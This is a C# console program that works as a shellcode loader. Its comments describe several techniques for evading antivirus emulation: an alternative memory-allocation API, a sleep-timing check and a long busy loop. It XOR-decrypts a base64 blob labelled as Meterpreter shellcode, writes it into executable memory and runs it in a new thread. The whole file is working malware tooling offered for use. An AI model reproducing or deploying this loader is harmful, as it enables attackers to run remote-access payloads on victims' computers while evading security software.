using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(
            IntPtr hProcess, 
            IntPtr lpAddress,
            uint dwSize, 
            UInt32 flAllocationType, 
            UInt32 flProtect, 
            UInt32 nndPreferred);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
         IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr
        lpThreadId);
       
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
                
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern UInt32 FlsAlloc(IntPtr lpCallback);

        static void Main(string[] args)
        {
            // EVASION 1: Reserve memory by using an alternative API. VirtualAllocExNuma vs VirtualAlloc to evade emulation
            //IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr addr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x40, 0);
            if (addr == null)
            {
                return;
            }

            /* EVASION 2: Sleep to evade emulation */
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 <8)
            {
                return;
            }

            /*EVASION 2: FlsAlloc to evade emulation. AV always returns FLS_OUT_OF_INDEXES=0xFFFFFFFF*/
            /*
            UInt32 result = FlsAlloc(IntPtr.Zero);
            if (result == 0xFFFFFFFF)
            {
                return;
            }
            */

            /* EVASION 3: Iterates through a for loop nine hundred million times in an effort to discourage AV from emulating */
            int count = 0;
            int max = 900000000;
            for (int i = 0; i < max; i++)
            {
                count++;
            }
            if (count == max)
            {
                runner();
            }


            void runner()
            {
                string key = "Sup3rS3cr3t!";
                string base64Encoded = "rz3z14K7/2NyMzVwEiUiYjpi4TUXe/9zMz37YWobuDFSfkXoG3rHeTgbuBEie0Xh/0kRT3B/EyKz+nlgUrSS3iAbuDFSuDYdEiQ4MqI1shtqOHYu1gdwM3LYs+tyM3Rp1rUEVDpS4+g6KyRl2DVQenOD0DU6zL1g2EH4fkOae2Kke0Xh/zSx+n8SMqJK0wHQH3Y8F3oWCrIH6yxl2DVUenODVSL5Pzxl2DVsenODcuh2uzwggzQocioNajkzazV4Ei84sJ5zcjGN0yxgCi84uGC6eJyNzClpYq4jeswkWg0bXRFVUzQme/uyeqSwfwMHVIqlYCEbuoIhaTkQkzhB+iEAetlIZQ2GU3VwM42G221yM3QQakdeAkRrHVJcAkIXUy84urMa9KPJMnQhHkS5YCE5MDA7iSOozLNwM3JTzLaaQnQhU1pBRENjQSgqdh5JPxYoAkM3YzweeSRWOiw3HkVnWhcgRztlIy0GACAEV1IlfjlCKgEhSjwdBSw5XS57PzwAeRsqYg8QSx5COUIFCwM2XTkCUjZzA0RCAR4XazwqXRpIakUqZRkrAgwiAjxnEkdHQEpTe+qzYC5gCzhB+iEbi2NAm/AhU3VwYyEAeqSw2CEPaIqle/uVWWkte/3QOWoqYRrTAGNyev3BOXExajvpRiXstXQhU3WP5j9i8zAoe/3QHkS5fkOaYDA79LYMVW0LzKfW8xZte7Pg22ZwMzvpd5NH03QhU3WP5jqs/Bdw2N7JBnVwMyEKWSMoev3wkpdgerWTM3NyMz2bC9Ej1nJTM2ON5jyyACY4upUbupI6uq5olLVwE3JTeuqLes4zxfySM3JTM5yne/flc/CwR8A1uGQ6MrekkwCia7ELWWMriJQ8eX8xuqis5g==";

                byte[] buf = System.Convert.FromBase64String(base64Encoded);

                /* Meterpreter decryption */
                Console.WriteLine("[+] Decrypting the shellcode");
                for (int i = 0; i < buf.Length; i++)
                {
                    buf[i] = (byte)(((uint)buf[i] ^ key[i % (key.Length)]) & 0xFF);
                }


                int size = buf.Length;
                Marshal.Copy(buf, 0, addr, size);
                IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
        }
    }
}
